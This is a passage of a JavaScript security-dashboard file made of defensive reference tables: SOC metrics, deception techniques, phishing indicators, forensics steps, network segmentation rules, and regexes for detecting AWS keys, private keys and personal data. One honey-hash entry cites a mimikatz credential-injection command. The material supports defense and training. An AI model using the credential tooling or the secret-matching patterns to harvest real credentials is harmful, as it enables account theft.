  { name: 'Recorded Future', type: 'Commercial TI', desc: 'AI-powered threat intelligence from open, dark, and technical sources', features: ['Real-time alerting','Risk scoring','Dark web monitoring','Vulnerability intel','Brand protection','API and integrations'], deployment: 'Cloud (SaaS)', cost: 'Commercial ($$$$)' },
  { name: 'Mandiant Advantage', type: 'Commercial TI', desc: 'Threat intelligence from Google/Mandiant incident response data', features: ['APT tracking','Malware analysis','Vulnerability assessment','Attack surface management','Digital risk protection'], deployment: 'Cloud (SaaS)', cost: 'Commercial ($$$)' },
  { name: 'ThreatConnect', type: 'Commercial TIP', desc: 'Threat Intelligence Platform with orchestration and automation', features: ['Intelligence ops','Playbook automation','Risk quantification','CAL analytics','Integration marketplace','Collaborative analysis'], deployment: 'Cloud or On-prem', cost: 'Commercial ($$$)' },
  { name: 'Anomali ThreatStream', type: 'Commercial TIP', desc: 'Enterprise threat intelligence management and operationalization', features: ['Feed aggregation','IOC management','SIEM integration','Sandbox analysis','Dark web monitoring','Machine learning enrichment'], deployment: 'Cloud or On-prem', cost: 'Commercial ($$$)' },
];

// ============================================================================
// SECURITY OPERATIONS CENTER (SOC) METRICS
// ============================================================================
const SOC_METRICS = [
  { metric: 'MTTD', full: 'Mean Time to Detect', benchmark: '< 24 hours', industry: '197 days (2023 avg)', desc: 'Average time from compromise to detection. Lower is better.', improve: 'Deploy EDR, enable alerting, implement threat hunting program' },
  { metric: 'MTTR', full: 'Mean Time to Respond', benchmark: '< 4 hours (P1)', industry: '73 days (2023 avg)', desc: 'Average time from detection to containment/resolution.', improve: 'Automate containment, pre-built playbooks, IR team readiness' },
  { metric: 'MTTA', full: 'Mean Time to Acknowledge', benchmark: '< 15 minutes (P1)', industry: 'Varies', desc: 'Time from alert to analyst acknowledgment and triage.', improve: 'SOC staffing, alert routing automation, on-call procedures' },
  { metric: 'Alert Volume', full: 'Total Alerts per Day', benchmark: '< 500 meaningful', industry: '10,000+ (many false positives)', desc: 'Total security alerts generated per day requiring analyst review.', improve: 'Tune detection rules, implement alert correlation, ML-based reduction' },
  { metric: 'False Positive Rate', full: 'Percentage of False Positives', benchmark: '< 20%', industry: '50-80%', desc: 'Percentage of alerts that are not actual security incidents.', improve: 'Tune detection rules, use threat intel enrichment, ML triage' },
  { metric: 'Escalation Rate', full: 'Alerts Escalated to IR', benchmark: '5-15%', industry: 'Varies', desc: 'Percentage of triaged alerts escalated to incident response.', improve: 'Improve L1 analysis capabilities, clear escalation criteria' },
  { metric: 'Coverage', full: 'MITRE ATT&CK Coverage', benchmark: '> 70% of relevant techniques', industry: '30-40%', desc: 'Percentage of MITRE techniques with active detection rules.', improve: 'Gap analysis, detection engineering program, purple team exercises' },
  { metric: 'Dwell Time', full: 'Attacker Dwell Time', benchmark: '< 7 days', industry: '16 days (2023 median)', desc: 'Time attacker remains undetected in the environment.', improve: 'Threat hunting, better detection coverage, deception technology' },
  { metric: 'Incidents/Month', full: 'Security Incidents per Month', benchmark: 'Trending down', industry: '5-20 (enterprise)', desc: 'Number of confirmed security incidents per month.', improve: 'Reduce attack surface, improve controls, security awareness' },
  { metric: 'Patching SLA', full: 'Patch Application Time', benchmark: 'Critical: 72h, High: 7d', industry: '60+ days', desc: 'Time from vulnerability disclosure to patch deployment.', improve: 'Automated patching, vulnerability management program, risk-based prioritization' },
  { metric: 'Tabletop Frequency', full: 'IR Exercise Frequency', benchmark: 'Quarterly', industry: 'Annually (if at all)', desc: 'Frequency of incident response tabletop exercises.', improve: 'Schedule quarterly exercises, rotate scenarios, include executives' },
  { metric: 'Cost per Incident', full: 'Average Incident Response Cost', benchmark: 'Measure and trend', industry: '$4.45M avg breach (2023)', desc: 'Total cost of incident response including containment, recovery, and notification.', improve: 'Incident preparedness, cyber insurance, automated response' },
];

// ============================================================================
// DECEPTION TECHNOLOGY / HONEYPOT REFERENCE
// ============================================================================
const DECEPTION_TECH = [
  { name: 'Canary Tokens', type: 'Tripwire', desc: 'Trackable tokens that alert when accessed - files, URLs, DNS, AWS keys', deployment: 'Simple - place token in sensitive locations', detection: 'Alerts on token access via email/webhook', cost: 'Free', examples: ['Word document canary','DNS canary','AWS credential canary','Web bug canary','Cloned website canary'] },
  { name: 'HoneyPots', type: 'Decoy System', desc: 'Fake systems designed to detect, deflect, and study attacks', deployment: 'Deploy in network segments alongside real assets', detection: 'Any interaction with honeypot is suspicious by definition', cost: 'Free (open source) to Commercial', examples: ['Cowrie (SSH/Telnet)','Dionaea (multiple services)','HoneyD (network-level)','T-Pot (multi-honeypot)'] },
  { name: 'Honey Users', type: 'Decoy Account', desc: 'Fake AD accounts that generate alerts when authenticated against', deployment: 'Create realistic-looking AD accounts with SPN or weak password', detection: 'Any login attempt or TGS request for these accounts is an attack', cost: 'Free (built-in AD)', examples: ['svc_backup_admin','admin.legacy','da_maintenance','sql_service_old'] },
  { name: 'Honey Files', type: 'Decoy Data', desc: 'Fake sensitive files (passwords.xlsx, etc.) that alert when opened', deployment: 'Place in file shares, desktops, common directories', detection: 'File access generates alert via file integrity monitoring', cost: 'Free', examples: ['passwords.xlsx','credentials.txt','VPN_Backup_Config.zip','Financial_Report_CONFIDENTIAL.docx'] },
  { name: 'Honey Shares', type: 'Decoy Share', desc: 'Fake network shares that generate alerts when enumerated or accessed', deployment: 'Create SMB shares on servers with monitoring', detection: 'Share enumeration or access attempts trigger alerts', cost: 'Free', examples: ['\\\\server\\IT_Admin$','\\\\dc01\\Backup_Creds','\\\\fileserver\\Executive_Data'] },
  { name: 'Honey Hashes', type: 'Decoy Credential', desc: 'Fake cached credentials (NTLM hashes) placed in LSASS memory', deployment: 'Inject fake credentials into LSASS via NewCredentials logon', detection: 'Any use of the honey hash on the network indicates credential theft', cost: 'Free', examples: ['Inject via runas /netonly','Use mimikatz sekurlsa::pth to plant','Monitor for authentication with honey hash'] },
  { name: 'Honey Tables', type: 'Decoy Database', desc: 'Fake database tables with tracking data that alerts on access', deployment: 'Create tables named "user_credentials", "credit_cards" with tracked data', detection: 'SQL queries against honey tables indicate database compromise', cost: 'Free', examples: ['Table: admin_passwords','Table: credit_card_data','Table: employee_ssn','Tracked data: unique emails that alert on use'] },
  { name: 'Honey DNS', type: 'Decoy DNS', desc: 'Internal DNS records pointing to honeypots or canary systems', deployment: 'Add DNS records for fake internal services', detection: 'DNS resolution or connection to honey DNS targets indicates recon', cost: 'Free', examples: ['intranet-legacy.corp.local','vpn-backup.corp.local','admin-portal.corp.local'] },
];


// ============================================================================
// PHISHING INDICATORS AND ANALYSIS REFERENCE
// ============================================================================
const PHISHING_INDICATORS = [
  { category: 'Header Analysis', indicators: ['Mismatched From/Return-Path addresses','SPF fail or softfail result','DKIM signature failure or absence','DMARC policy violation','Unusual X-Originating-IP (foreign country)','Reply-To different from From address','Multiple recipients in BCC','Unusual mail client in X-Mailer header'] },
  { category: 'URL Analysis', indicators: ['Lookalike domains (paypa1.com, microsft.com)','Punycode/IDN homograph attacks (xn--paypl-7oc.com)','URL shorteners (bit.ly, tinyurl.com) masking destination','IP address instead of domain name','Suspicious TLD (.xyz, .top, .click, .buzz)','Recently registered domain (< 30 days)','Mismatched anchor text vs actual URL','Base64 or hex encoded parameters'] },
  { category: 'Content Analysis', indicators: ['Urgency language ("act now", "account suspended", "unauthorized access")','Grammar and spelling errors','Generic greeting ("Dear Customer" instead of name)','Request for credentials or personal information','Threatening consequences for inaction','Impersonation of authority (CEO, IT department, legal)','Unexpected attachments','Request to enable macros or content'] },
  { category: 'Attachment Analysis', indicators: ['Office documents with macros (.docm, .xlsm)','ISO/IMG disk image files containing executables','OneNote files with embedded scripts','HTML attachments with JavaScript','Password-protected archives (evading scanning)','Double extensions (report.pdf.exe)','LNK files (Windows shortcuts)','Executables renamed as documents'] },
  { category: 'Infrastructure', indicators: ['Newly registered domain (WHOIS creation < 30 days)','Domain registered through privacy service','Free hosting provider (000webhostapp, wix, weebly)','Let\'s Encrypt certificate on phishing site','Cloudflare/CDN hiding origin (can be legitimate too)','Known phishing kit patterns in page source','Automated redirection chains','Open redirector abuse on legitimate sites'] },
];

// ============================================================================
// VULNERABILITY DISCLOSURE TIMELINE REFERENCE
// ============================================================================
const VULN_TIMELINE = [
  { phase: 'Discovery', timeline: 'Day 0', responsible: 'Researcher/Bug Bounty', actions: ['Document vulnerability with PoC','Verify impact and severity','Check for existing CVE/advisory','Determine affected versions'] },
  { phase: 'Vendor Notification', timeline: 'Day 1-3', responsible: 'Researcher', actions: ['Contact vendor security team (security@vendor)','Use encrypted communication (PGP/S-MIME)','Provide detailed technical report with PoC','Request acknowledgment within 5 business days'] },
  { phase: 'Vendor Acknowledgment', timeline: 'Day 3-7', responsible: 'Vendor', actions: ['Acknowledge receipt of report','Assign internal tracking number','Begin triage and reproduction','Communicate initial assessment to researcher'] },
  { phase: 'CVE Assignment', timeline: 'Day 7-14', responsible: 'CNA/MITRE', actions: ['Request CVE from CNA or MITRE','Provide vulnerability description','Determine CVSS score','Coordinate with vendor on timeline'] },
  { phase: 'Patch Development', timeline: 'Day 14-60', responsible: 'Vendor', actions: ['Develop and test fix','Backport to supported versions','Prepare security advisory','Coordinate disclosure date with researcher'] },
  { phase: 'Patch Release', timeline: 'Day 60-90', responsible: 'Vendor', actions: ['Release patch/update','Publish security advisory with CVE','Notify customers and partners','Update documentation'] },
  { phase: 'Public Disclosure', timeline: 'Day 90 (industry standard)', responsible: 'Researcher + Vendor', actions: ['Publish detailed advisory','Release technical writeup','Present at conferences (if applicable)','Share IOCs and detection guidance'] },
  { phase: 'Post-Disclosure', timeline: 'Day 90+', responsible: 'Community', actions: ['Security tools add detection signatures','Patch adoption monitoring','Exploitation monitoring (KEV list)','Variant research and related vuln hunting'] },
];

// ============================================================================
// RISK SCORING METHODOLOGY
// ============================================================================
const RISK_METHODOLOGY = {
  likelihood: [
    { level: 5, name: 'Almost Certain', description: 'Expected to occur in most circumstances. Active exploitation observed.', frequency: 'Daily/Weekly', examples: ['Known exploited vulnerability with public PoC','Active phishing campaign targeting organization','Internet-exposed service with default credentials'] },
    { level: 4, name: 'Likely', description: 'Will probably occur in most circumstances. Exploitation feasible.', frequency: 'Monthly', examples: ['Unpatched critical vulnerability','Weak password policy','Misconfigured cloud storage'] },
    { level: 3, name: 'Possible', description: 'Could occur at some time. Requires specific conditions.', frequency: 'Quarterly', examples: ['Social engineering attacks','Supply chain compromise','Insider threat'] },
    { level: 2, name: 'Unlikely', description: 'Not expected but possible. Requires significant effort or access.', frequency: 'Annually', examples: ['Zero-day exploitation','Physical security breach','Advanced persistent threat targeting'] },
    { level: 1, name: 'Rare', description: 'May occur only in exceptional circumstances.', frequency: 'Multi-year', examples: ['Nation-state targeted attack','Novel attack technique','Catastrophic infrastructure failure'] },
  ],
  impact: [
    { level: 5, name: 'Catastrophic', description: 'Organization-threatening event. Existential risk.', financial: '> $10M or > 5% revenue', operational: 'Complete business shutdown > 1 week', data: 'Mass PII/PHI breach (millions of records)', reputation: 'National/international media coverage, regulatory action', examples: ['Ransomware across entire infrastructure','Massive data breach with PII','Critical infrastructure sabotage'] },
    { level: 4, name: 'Major', description: 'Significant impact to operations and reputation.', financial: '$1M - $10M', operational: 'Major systems down 1-7 days', data: 'Significant data breach (thousands of records)', reputation: 'Industry media, customer notifications required', examples: ['Department-wide ransomware','Database exfiltration','Executive email compromise with wire fraud'] },
    { level: 3, name: 'Moderate', description: 'Noticeable impact requiring significant response effort.', financial: '$100K - $1M', operational: 'Key systems down < 24 hours', data: 'Limited data exposure (hundreds of records)', reputation: 'Local media, some customer concern', examples: ['Server compromise with lateral movement','Targeted phishing with credential theft','Insider data theft'] },
    { level: 2, name: 'Minor', description: 'Limited impact, manageable with standard procedures.', financial: '$10K - $100K', operational: 'Non-critical system disruption < 8 hours', data: 'Minimal data exposure (individual records)', reputation: 'Minor stakeholder concern', examples: ['Single endpoint malware','Unsuccessful attack attempt','Policy violation'] },
    { level: 1, name: 'Negligible', description: 'Minimal impact, handled as part of normal operations.', financial: '< $10K', operational: 'No measurable disruption', data: 'No data compromise', reputation: 'No external visibility', examples: ['Blocked port scan','Quarantined malware email','Failed login attempts'] },
  ],
};

// ============================================================================
// SECURITY ARCHITECTURE PATTERNS
// ============================================================================
const SECURITY_PATTERNS = [
  { name: 'Zero Trust Architecture', principle: 'Never trust, always verify', components: ['Identity-centric access','Micro-segmentation','Continuous verification','Least privilege access','Assume breach mindset'], implementation: ['Deploy identity provider with MFA','Implement device health checks','Use software-defined perimeter','Monitor all network traffic','Encrypt all communications'], standards: ['NIST SP 800-207','CISA Zero Trust Maturity Model','Forrester ZTX Framework'] },
  { name: 'Defense in Depth', principle: 'Multiple overlapping security controls', components: ['Physical security','Network security','Host security','Application security','Data security','Administrative controls'], implementation: ['Firewalls + IDS/IPS at perimeter','EDR on all endpoints','WAF for web applications','DLP for data protection','MFA for authentication','Security awareness training'], standards: ['NIST CSF','CIS Controls','ISO 27001'] },
  { name: 'Principle of Least Privilege', principle: 'Grant minimum access required for the task', components: ['Role-based access control','Just-in-time access','Privileged access management','Regular access reviews','Separation of duties'], implementation: ['PAM solution for admin access','JIT elevation for privileged tasks','Regular access certification campaigns','Remove standing admin privileges','Implement RBAC across all systems'], standards: ['NIST 800-53 AC-6','CIS Control 6','PCI DSS Requirement 7'] },
  { name: 'Assume Breach', principle: 'Design systems assuming the attacker is already inside', components: ['Internal network monitoring','Microsegmentation','Deception technology','Threat hunting program','Incident response readiness'], implementation: ['Monitor east-west traffic','Deploy internal honeypots','Conduct regular threat hunts','Practice IR through tabletops','Implement data-centric security'], standards: ['MITRE ATT&CK','NIST CSF DE/RS functions','Microsoft Assume Breach model'] },
  { name: 'Security by Design', principle: 'Build security into systems from the start', components: ['Threat modeling','Secure coding practices','Security testing in CI/CD','Security architecture review','Secure defaults'], implementation: ['STRIDE/DREAD threat modeling','SAST/DAST in pipeline','Dependency scanning (SCA)','Container image scanning','Infrastructure as Code scanning'], standards: ['OWASP ASVS','NIST SSDF','Microsoft SDL','BSIMM'] },
];


// ============================================================================
// DIGITAL FORENSICS PROCESS MODEL
// ============================================================================
const FORENSICS_PROCESS = [
  { phase: 'Identification', steps: ['Identify potential sources of digital evidence','Determine scope and boundaries of investigation','Identify relevant legal requirements and chain of custody needs','Prioritize evidence sources by volatility (RFC 3227 order)','Document initial findings and observations'], tools: ['Initial triage tools','Network monitoring','System logs','Interviews'], volatility_order: ['1. CPU registers/cache','2. Routing tables, ARP cache, process table','3. RAM (memory dump)','4. Temporary file systems (/tmp)','5. Disk (hard drive/SSD)','6. Remote logging data','7. Physical configuration, network topology','8. Archival media (tape, optical)'] },
  { phase: 'Preservation', steps: ['Secure the scene - prevent evidence contamination','Document system state (photos, screenshots, running processes)','Capture volatile evidence first (RAM, network connections)','Create forensic images of storage media (bit-for-bit)','Generate and verify hash values (MD5 + SHA-256)','Establish and maintain chain of custody documentation','Store evidence in tamper-evident containers'], tools: ['FTK Imager','dd/dcfldd','WinPMEM/LiME','ewfacquire','Write blockers','Faraday bags (mobile)','Evidence tags and labels'] },
  { phase: 'Collection', steps: ['Collect forensic images from all identified sources','Gather network logs (firewall, proxy, DNS, IDS/IPS)','Export email and cloud data via legal hold/eDiscovery','Collect endpoint telemetry from EDR/AV','Retrieve cloud audit logs (CloudTrail, Azure Activity Log)','Preserve social media and web content if relevant','Document all collection activities with timestamps'], tools: ['KAPE (Kroll Artifact Parser)','Velociraptor','GRR Rapid Response','X-Ways Forensics','Autopsy','Cloud forensics APIs'] },
  { phase: 'Examination', steps: ['Mount forensic images read-only','Recover deleted files and artifacts','Extract and parse forensic artifacts (registry, event logs, prefetch)','Build super timeline from all data sources','Identify IOCs (hashes, IPs, domains, filenames)','Analyze malware samples in sandbox','Correlate findings across multiple evidence sources'], tools: ['Autopsy','X-Ways Forensics','Plaso/log2timeline','Registry Explorer','EvtxECmd','Volatility (memory)','YARA scanning'] },
  { phase: 'Analysis', steps: ['Reconstruct the attack timeline','Identify initial access vector','Map attacker lateral movement and privilege escalation','Determine data accessed and exfiltrated','Identify persistence mechanisms installed','Attribute attack to threat actor if possible','Assess full scope of compromise'], tools: ['Timeline analysis','MITRE ATT&CK mapping','IOC correlation','Threat intelligence','Network forensics','Log analysis'] },
  { phase: 'Reporting', steps: ['Document all findings in structured report','Include executive summary for non-technical stakeholders','Provide technical details with evidence references','List all IOCs discovered','Map attack to MITRE ATT&CK framework','Provide remediation recommendations','Prepare for potential legal proceedings'], tools: ['Report templates','Evidence management system','IOC export (STIX, OpenIOC)','Timeline visualization','Executive presentation'] },
];

// ============================================================================
// COMMON REGEX PATTERNS FOR SECURITY ANALYSIS
// ============================================================================
const SECURITY_REGEX = [
  { name: 'IPv4 Address', pattern: '\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b', usage: 'Extract IP addresses from logs, reports, and threat intel' },
  { name: 'IPv6 Address', pattern: '(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}', usage: 'Extract IPv6 addresses from logs and configurations' },
  { name: 'MD5 Hash', pattern: '\\b[0-9a-fA-F]{32}\\b', usage: 'Extract MD5 hashes from malware reports and IOC feeds' },
  { name: 'SHA-1 Hash', pattern: '\\b[0-9a-fA-F]{40}\\b', usage: 'Extract SHA-1 hashes from certificate and file analysis' },
  { name: 'SHA-256 Hash', pattern: '\\b[0-9a-fA-F]{64}\\b', usage: 'Extract SHA-256 hashes from EDR alerts and threat intel' },
  { name: 'Email Address', pattern: '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', usage: 'Extract email addresses from phishing analysis and OSINT' },
  { name: 'URL', pattern: 'https?:\\/\\/[^\\s<>"{}|\\\\^`\\[\\]]+', usage: 'Extract URLs from email headers, logs, and malware analysis' },
  { name: 'Domain', pattern: '(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\\.)+[a-zA-Z]{2,}', usage: 'Extract domain names from DNS logs and network traffic' },
  { name: 'Windows File Path', pattern: '[A-Za-z]:\\\\(?:[^\\\\/:*?"<>|\\r\\n]+\\\\)*[^\\\\/:*?"<>|\\r\\n]*', usage: 'Extract Windows file paths from process logs and alerts' },
  { name: 'Linux File Path', pattern: '\\/(?:[^\\/\\0]+\\/)*[^\\/\\0]+', usage: 'Extract Linux file paths from auth logs and process monitoring' },
  { name: 'CVE ID', pattern: 'CVE-\\d{4}-\\d{4,}', usage: 'Extract CVE identifiers from vulnerability reports and advisories' },
  { name: 'MITRE ATT&CK ID', pattern: 'T\\d{4}(?:\\.\\d{3})?', usage: 'Extract MITRE technique IDs from threat reports' },
  { name: 'Base64 Encoded', pattern: '(?:[A-Za-z0-9+\\/]{4}){8,}(?:[A-Za-z0-9+\\/]{2}==|[A-Za-z0-9+\\/]{3}=)?', usage: 'Detect Base64 encoded data in PowerShell commands and web traffic' },
  { name: 'JWT Token', pattern: 'eyJ[A-Za-z0-9_-]*\\.eyJ[A-Za-z0-9_-]*\\.[A-Za-z0-9_-]*', usage: 'Detect JWT tokens in logs, headers, and authentication flows' },
  { name: 'AWS Access Key', pattern: '(?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}', usage: 'Detect AWS access key IDs in code, configs, and logs' },
  { name: 'Private Key', pattern: '-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----', usage: 'Detect exposed private keys in source code and configurations' },
  { name: 'Credit Card (Visa)', pattern: '4[0-9]{12}(?:[0-9]{3})?', usage: 'PCI compliance scanning - detect card numbers in data stores' },
  { name: 'SSN (US)', pattern: '\\b\\d{3}-\\d{2}-\\d{4}\\b', usage: 'PII scanning - detect Social Security Numbers in documents' },
  { name: 'MAC Address', pattern: '(?:[0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}', usage: 'Extract MAC addresses from network logs and ARP tables' },
  { name: 'Bitcoin Address', pattern: '\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b', usage: 'Detect Bitcoin addresses in ransomware notes and dark web monitoring' },
];


// ============================================================================
// NETWORK SEGMENTATION BEST PRACTICES
// ============================================================================
const SEGMENTATION_RULES = [
  { from: 'Internet', to: 'DMZ', allow: ['HTTP (80)','HTTPS (443)','DNS (53)','SMTP (25/587)'], deny: 'All other ports', notes: 'Only allow services that need internet exposure' },
  { from: 'DMZ', to: 'Internal', allow: ['Specific application ports only','Database connections from web tier','LDAP for authentication'], deny: 'Direct access to workstations, admin shares, RDP', notes: 'Strict application-level firewall rules. No lateral from DMZ.' },
  { from: 'Internal', to: 'Server', allow: ['Application-specific ports','SMB (445) to file servers','LDAP/Kerberos to DCs','DNS (53)'], deny: 'Direct RDP to servers (use jump box), Admin shares from non-admin VLANs', notes: 'Users should access servers through applications, not directly' },
  { from: 'Internal', to: 'Internet', allow: ['HTTP/S via proxy (3128/8080)','DNS via internal resolver only'], deny: 'Direct internet access, all non-proxied traffic', notes: 'Force all traffic through proxy for inspection and logging' },
  { from: 'Management', to: 'All Zones', allow: ['SSH (22)','RDP (3389)','WinRM (5985/5986)','SNMP (161)','HTTPS management (8443)'], deny: 'N/A (management needs broad access)', notes: 'Only accessible from PAWs. MFA required. Full logging.' },
  { from: 'Guest', to: 'Any Internal', allow: ['None'], deny: 'All internal access', notes: 'Complete isolation. Internet-only through captive portal.' },
  { from: 'IoT/OT', to: 'Internal', allow: ['Monitoring data to SIEM only','NTP (123)','DNS (53) to internal resolver'], deny: 'All other internal access', notes: 'IoT devices should be on isolated VLANs with no corporate access' },
  { from: 'Development', to: 'Production', allow: ['CI/CD pipeline deployment ports only','Monitoring'], deny: 'Direct developer access to production systems', notes: 'Deployments through automated pipeline only. No manual production access.' },
  { from: 'Backup', to: 'All Zones', allow: ['Backup agent ports','Management from PAW only'], deny: 'Interactive access from non-management sources', notes: 'Backup network should be isolated. Air-gapped backup copy recommended.' },
  { from: 'Cloud VPC', to: 'On-Premises', allow: ['VPN tunnel (IPSec/WireGuard)','Specific application ports'], deny: 'Broad network access', notes: 'Site-to-site VPN with strict ACLs. Consider Direct Connect/ExpressRoute for sensitive workloads.' },
];

// ============================================================================
// SECURITY TOOL CATEGORIES AND RECOMMENDATIONS
// ============================================================================
const SECURITY_TOOLS_CATEGORIES = [
  { category: 'Endpoint Detection & Response (EDR)', purpose: 'Real-time endpoint monitoring, threat detection, and response', tools: ['CrowdStrike Falcon','Microsoft Defender for Endpoint','SentinelOne','Carbon Black','Cortex XDR'], openSource: ['Wazuh','OSSEC','Velociraptor'], keyFeatures: ['Process monitoring','Behavioral detection','Automated response','Threat hunting','Forensic data collection'] },
  { category: 'SIEM', purpose: 'Log aggregation, correlation, alerting, and compliance', tools: ['Splunk Enterprise','Microsoft Sentinel','QRadar','LogRhythm','Exabeam'], openSource: ['Elastic SIEM','Wazuh','Graylog','Apache Metron'], keyFeatures: ['Log ingestion','Correlation rules','Dashboards','Alerting','Compliance reporting','UEBA'] },
  { category: 'Network Detection & Response (NDR)', purpose: 'Network traffic analysis and threat detection', tools: ['Darktrace','Vectra AI','ExtraHop','Corelight','Gigamon'], openSource: ['Zeek (Bro)','Suricata','Snort','RITA','SecurityOnion'], keyFeatures: ['Traffic analysis','Anomaly detection','Protocol parsing','Encrypted traffic analysis','Lateral movement detection'] },
  { category: 'Vulnerability Management', purpose: 'Identify and prioritize vulnerabilities across infrastructure', tools: ['Tenable Nessus/io','Qualys VMDR','Rapid7 InsightVM','Microsoft Defender VM'], openSource: ['OpenVAS/Greenbone','Nuclei','Trivy','Grype'], keyFeatures: ['Asset discovery','Vulnerability scanning','Risk prioritization','Patch management','Compliance checks'] },
  { category: 'Identity & Access Management (IAM)', purpose: 'Manage identities, authentication, and authorization', tools: ['Okta','Azure AD/Entra ID','CyberArk','BeyondTrust','Ping Identity'], openSource: ['Keycloak','FreeIPA','OpenLDAP','Authelia'], keyFeatures: ['SSO','MFA','PAM','Access governance','Identity lifecycle','RBAC/ABAC'] },
  { category: 'Cloud Security Posture Management (CSPM)', purpose: 'Monitor cloud configurations for security best practices', tools: ['Prisma Cloud','Wiz','Lacework','Orca Security','AWS Security Hub'], openSource: ['Prowler (AWS)','ScoutSuite','CloudSploit','Steampipe'], keyFeatures: ['Misconfiguration detection','Compliance mapping','Risk visualization','Auto-remediation','Multi-cloud support'] },
  { category: 'Email Security', purpose: 'Protect against email-borne threats', tools: ['Proofpoint','Mimecast','Microsoft Defender for Office 365','Abnormal Security'], openSource: ['MailScanner','SpamAssassin','ClamAV','Rspamd'], keyFeatures: ['Anti-phishing','Sandbox detonation','URL rewriting','DMARC enforcement','BEC detection','User reporting'] },
  { category: 'Web Application Firewall (WAF)', purpose: 'Protect web applications from attacks', tools: ['Cloudflare WAF','AWS WAF','Imperva','F5 ASM','Akamai'], openSource: ['ModSecurity','NAXSI','Coraza','SafeLine'], keyFeatures: ['OWASP Top 10 protection','Rate limiting','Bot detection','Virtual patching','API protection','DDoS mitigation'] },
  { category: 'Data Loss Prevention (DLP)', purpose: 'Prevent unauthorized data exfiltration', tools: ['Microsoft Purview','Symantec DLP','Digital Guardian','Forcepoint DLP'], openSource: ['OpenDLP','MyDLP'], keyFeatures: ['Content inspection','Policy enforcement','Endpoint DLP','Network DLP','Cloud DLP','Incident management'] },
  { category: 'Threat Intelligence Platform (TIP)', purpose: 'Aggregate, correlate, and operationalize threat intelligence', tools: ['Anomali','ThreatConnect','Recorded Future','Mandiant Advantage'], openSource: ['MISP','OpenCTI','YETI','CRITs'], keyFeatures: ['Feed aggregation','IOC management','STIX/TAXII support','SIEM integration','Enrichment','Sharing'] },
];

// ============================================================================
// END OF REFERENCE DATABASES
// Total databases: CVE_DB, DEFAULT_CREDS, APT_DB, MITRE_MATRIX, THREAT_IPS,
// THREAT_DOMAINS, DGA_PATTERNS, SIGMA_TEMPLATES, SNORT_TEMPLATES,
// IR_PLAYBOOKS, NOC_TOPOLOGY, NOC_LINKS, NOC_CONNECTIONS, NOC_ANOMALIES,
// SHELLCODE_TEMPLATES, ROP_GADGETS, AD_SIM_USERS, AD_ATTACK_PATHS,
// AD_ATTACKS_DB, CLOUD_ASSETS, CLOUD_PRIVESC_PATHS, CONTAINER_ESCAPES,
// HUNT_HYPOTHESES, HUNT_PLAYBOOKS, WARROOM_TEMPLATES, EVIDENCE_TYPES,
// STIX_FEEDS, DARKWEB_MENTIONS, YARA_RULES, PORT_REFERENCE,
// FORENSIC_ARTIFACTS, OSINT_TOOLS, PROTOCOL_SIGNATURES,
// PERSISTENCE_MECHANISMS, VULNERABLE_CONFIGS, MALWARE_FAMILIES,
// HASH_TYPES, WINDOWS_EVENTS, LATERAL_MOVEMENT_TECHNIQUES,
// CRYPTO_ALGORITHMS, PAYLOAD_TECHNIQUES, INJECTION_PAYLOADS,
// COMPLIANCE_FRAMEWORKS, NETWORK_ZONES, SEVERITY_MATRIX,
// TTP_MAPPING, LOG_SOURCES, PENTEST_COMMANDS, WORDLISTS,
// C2_INDICATORS, HARDENING_CHECKLISTS, TI_PLATFORMS, SOC_METRICS,
// DECEPTION_TECH, PHISHING_INDICATORS, VULN_TIMELINE,
// RISK_METHODOLOGY, SECURITY_PATTERNS, FORENSICS_PROCESS,
// SECURITY_REGEX, SEGMENTATION_RULES, SECURITY_TOOLS_CATEGORIES
// ============================================================================
// MISSION DATA MANAGER (localStorage)
// ============================================================================
const STORE_KEY = 'aegis_missions';
function loadMissions() { try { return JSON.parse(localStorage.getItem(STORE_KEY)) || []; } catch (_) { return []; } }
function saveMissions(missions) { try { localStorage.setItem(STORE_KEY, JSON.stringify(missions)); } catch (_) {} }
function getActiveMission() {
  var missions = loadMissions();
  var activeId = localStorage.getItem('aegis_active');
  return missions.find(function(m) { return m.id === activeId; }) || null;
}
function setActiveMission(id) { try { localStorage.setItem('aegis_active', id); } catch (_) {} }
function updateMission(mission) {
  var missions = loadMissions();
  var idx = missions.findIndex(function(m) { return m.id === mission.id; });
  if (idx >= 0) missions[idx] = mission; else missions.push(mission);
  saveMissions(missions);
}
function genId() { return Date.now().toString(36) + Math.random().toString(36).slice(2, 8); }

// ============================================================================
// SETTINGS
// ============================================================================
function loadSettings() {
  try { return JSON.parse(localStorage.getItem('aegis_settings')) || { operator: 'Operator', callsign: 'AEGIS-1', classification: 'UNCLASSIFIED', theme: 'cyan' }; }
  catch (_) { return { operator: 'Operator', callsign: 'AEGIS-1', classification: 'UNCLASSIFIED', theme: 'cyan' }; }
}
function saveSettings(s) { try { localStorage.setItem('aegis_settings', JSON.stringify(s)); } catch (_) {} }

// ============================================================================
// MAIN RENDER
// ============================================================================
export function renderAegis(main) {
  var settings = loadSettings();
  var activeTab = 'command';

  function render() {
    var mission = getActiveMission();
    var cls = settings.classification;
    var clsColor = cls === 'TOP SECRET' ? '#ff1744' : cls === 'SECRET' ? '#ff9100' : cls === 'CONFIDENTIAL' ? '#2196f3' : cls === 'CUI' ? '#7c4dff' : '#00e676';

    main.innerHTML =
      '<style>' +
      '.ag-wrap{font-family:"JetBrains Mono",ui-monospace,monospace;position:relative}' +
      '.ag-cls-banner{text-align:center;padding:4px;font-size:.65rem;font-weight:700;letter-spacing:.15em;color:#000}' +
      '.ag-header{display:flex;align-items:center;gap:16px;padding:16px 0;border-bottom:2px solid var(--acc);position:relative}' +
      '.ag-header::after{content:"";position:absolute;bottom:-2px;left:0;width:120px;height:2px;background:var(--acc);box-shadow:0 0 12px var(--acc)}' +
      '.ag-title{font-size:1.6rem;font-weight:800;letter-spacing:.12em;color:var(--acc);text-shadow:0 0 20px color-mix(in srgb,var(--acc) 40%,transparent);margin:0}' +
